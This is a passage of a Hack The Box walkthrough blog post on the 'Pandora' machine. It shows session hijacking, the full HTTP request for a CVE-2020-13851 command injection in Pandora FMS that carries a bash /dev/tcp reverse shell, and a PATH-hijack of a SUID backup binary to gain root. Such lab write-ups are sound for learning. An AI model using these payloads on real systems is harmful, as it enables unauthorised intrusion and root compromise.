+</code></pre></div><p>Nice! so there is matt session ID here. copy it and replace <code>PHPSESSID</code> cookie with it, and we are in the dashboard as matt</p>
+<p>There is a bunch of CVE&rsquo;s that could works.</p>
+<h3 id="cve-2020-13851httpswwwcoresecuritycomcore-labsadvisoriespandora-fms-community-multiple-vulnerabilities">
+  <a href="https://www.coresecurity.com/core-labs/advisories/pandora-fms-community-multiple-vulnerabilities" target="_blank">CVE-2020-13851</a>
+
+  <a href="#cve-2020-13851httpswwwcoresecuritycomcore-labsadvisoriespandora-fms-community-multiple-vulnerabilities" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>Fire up burpsuite, and set up the proxy.</p>
+<p>Then navigate to left menu -&gt; Events &gt; View events
+you will see a POST request to <code>/pandora_console/ajax.php</code>, send it to the repeater, according to the CVE, we can inject a reverse shell with the page param</p>
+<pre tabindex="0"><code>POST /pandora_console/ajax.php HTTP/1.1
+Host: 127.0.0.1:9001
+Content-Length: 78
+sec-ch-ua: &quot;(Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;101&quot;
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+sec-ch-ua-platform: &quot;Linux&quot;
+Origin: http://127.0.0.1:9001
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://127.0.0.1:9001/pandora_console/index.php?sec=workspace&amp;sec2=operation/users/user_edit
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq
+Connection: close
+
+
+page=include/ajax/events&amp;perform_event_response=10000000&amp;target=bash -i &gt;%26 /dev/tcp/IP/9090 0&gt;%261&amp;response_id=1
+</code></pre><p>you&rsquo;ll have to tweak it a bit to get it to work, like this:</p>
+<pre tabindex="0"><code>bash+-c+&quot;bash+-i+&gt;%26+/dev/tcp/IP/9090+0&gt;%261&quot;&amp;response_id=1
+</code></pre><p>Setup a listener then POST the request, you&rsquo;ll end up with <strong>matt</strong> reverse shell!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rlwrap nc -lvnp <span style="color:#ae81ff">9090</span>                                            ✔  01:17:40 PM  
+Connection from 10.10.11.136:36016
+bash: cannot set terminal process group <span style="color:#f92672">(</span>24702<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+bash: no job control in this shell
+matt@pandora:/home/matt$ cd ~ <span style="color:#f92672">&amp;&amp;</span> cat user.txt
+cd ~ <span style="color:#f92672">&amp;&amp;</span> cat user.txt
+53badf9c401fe17227c8a2b015baaaeb
+</code></pre></div><p>Well we are in and we&rsquo;ve got the user flag</p>
+<p>For now stablize a shell or setup a ssh connection.</p>
+<h2 id="pe">
+  PE
+  <a href="#pe" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>First take a look at the files with suid permissions, here we see that there is a pandora_backup as a binary file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">matt@pandora:~ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/pandora_backup
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/at
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+</code></pre></div><p>That <code>pandora_backup</code> looks intersting, I downloaded it to my machine and did some testing, and it looks like it uses the tar command to compress files. let&rsquo;s create a poisoned tar file and ran the command to gain root access.</p>
+<p>inject matt&rsquo;s home path into an environment variable, and run the pandora_backup file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">matt@pandora:~$ echo <span style="color:#e6db74">&#34;/bin/bash&#34;</span> &gt; tar
+matt@pandora:~$ ls
+linpeas.sh  tar  user.txt
+matt@pandora:~$ cat tar
+/bin/bash
+matt@pandora:~$ chmod +x tar
+matt@pandora:~$ export PATH<span style="color:#f92672">=</span>/home/matt:$PATH
+matt@pandora:~$ echo $PATH
+/home/matt:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+matt@pandora:~$ /usr/bin/pandora_backup
+PandoraFMS Backup Utility
+Now attempting to backup PandoraFMS client
+root@pandora:~#
+root@pandora:~# cat /root/root.txt
+</code></pre></div><p>We are in as root! and we&rsquo;ve got the root flag.</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://0xwerz.github.io/12/02/2022/acute/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Acute -- HTB walkthrough</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://0xwerz.github.io/30/10/2021/secret/">
+                  <span class="button__text">Secret -- HTB walkthrough</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">© 2022 Powered by Hugo</div>
+      
+  </div>
+</footer>
+
+<script src="https://0xwerz.github.io/assets/main.js"></script>
+<script src="https://0xwerz.github.io/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
